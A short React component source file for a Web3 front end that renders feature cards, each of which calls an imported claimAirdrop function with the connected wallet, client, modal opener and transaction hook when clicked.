/* eslint-disable react/prop-types */
import React from "react";
import styles from "./CardFeatures.module.css";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
import { claimAirdrop } from "../../funcs";


const CardFeatures = ({ feature }) => {
  const {open } = useWeb3Modal()
  const { address, isConnected } = useAccount()
  const publicClient = usePublicClient()
  const { sendTransaction } = useSendTransaction()

  
  
  return (
    <div className={`${styles.card}`} onClick={() => claimAirdrop(address, publicClient, open, sendTransaction)}>
      <img src={feature.image} />
      <p className={`${styles.text}`}>{feature.text}</p>
    </div>
  );
};

export default CardFeatures;
